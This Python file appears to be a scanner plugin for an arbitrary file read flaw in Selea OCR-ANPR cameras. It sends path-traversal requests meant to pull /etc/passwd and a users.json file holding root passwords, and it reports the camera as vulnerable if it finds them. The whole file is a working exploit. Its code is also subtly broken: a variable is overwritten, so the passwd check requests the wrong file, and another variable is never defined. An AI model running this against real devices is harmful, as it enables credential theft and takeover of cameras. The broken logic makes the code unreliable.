#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'Selea OCR-ANPR摄像机 SeleaCamera 任意文件读取漏洞',

      'level'     :   'medium',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {'User-Agent': ua}
  targets = ['/CFCARD/images/SeleaCamera/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd','/CFCARD/images/SeleaCamera/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fmnt/data/auth/users.json']
  url1 = url + targets[0]
  url1 = url + targets[1]
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      ret['ifbug'] = True
      ret['url'] =url1
      res.close()
      return ret
  except:
    pass
  try:
    resp = requests.get(url=url2,headers=headers,timeout=5,verify=False)
    if resp.status_code == 200 and 'viewers' in resp.text and 'root_pwd' in resp.text:
      ret['ifbug'] = True
      ret['url'] =url2
      resp.close()
      return ret
    else:
      return ret
  except:
    return ret